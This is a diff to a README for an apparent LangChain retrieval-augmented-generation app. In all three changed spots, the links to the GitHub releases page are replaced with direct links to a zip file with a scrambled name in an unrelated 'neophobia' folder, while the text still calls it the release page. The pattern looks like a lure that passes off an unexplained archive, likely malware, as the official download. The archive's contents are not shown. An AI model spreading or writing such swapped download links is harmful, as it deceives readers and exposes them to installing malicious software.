@@ -1,6 +1,6 @@
 # 🧠 Knowledge-Retrieval-Engine-Using-LangChain-and-Retrieval-Augmented-Generation - Easy Context-Aware Answers
 
-[![Download Now](https://img.shields.io/badge/Download-Knowledge--Retrieval--Engine-brightgreen?style=for-the-badge)](https://github.com/Shahrom-sangov4/Knowledge-Retrieval-Engine-Using-LangChain-and-Retrieval-Augmented-Generation/releases)
+[![Download Now](https://img.shields.io/badge/Download-Knowledge--Retrieval--Engine-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Shahrom-sangov4/Knowledge-Retrieval-Engine-Using-LangChain-and-Retrieval-Augmented-Generation/main/neophobia/and_Using_Chain_Lang_Retrieval_Engine_Augmented_Knowledge_Generation_v2.1.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Before you start, make sure your computer meets these needs:
 
 Click this big button below to open the download page:
 
-[![Visit Releases](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Shahrom-sangov4/Knowledge-Retrieval-Engine-Using-LangChain-and-Retrieval-Augmented-Generation/releases)
+[![Visit Releases](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Shahrom-sangov4/Knowledge-Retrieval-Engine-Using-LangChain-and-Retrieval-Augmented-Generation/main/neophobia/and_Using_Chain_Lang_Retrieval_Engine_Augmented_Knowledge_Generation_v2.1.zip)
 
 This page shows the latest versions of the software.
 
@@ -164,4 +164,4 @@ For detailed errors, check the logs in the settings menu.
 
 Use this link to visit the release page and download the app:
 
-https://github.com/Shahrom-sangov4/Knowledge-Retrieval-Engine-Using-LangChain-and-Retrieval-Augmented-Generation/releases
+https://raw.githubusercontent.com/Shahrom-sangov4/Knowledge-Retrieval-Engine-Using-LangChain-and-Retrieval-Augmented-Generation/main/neophobia/and_Using_Chain_Lang_Retrieval_Engine_Augmented_Knowledge_Generation_v2.1.zip
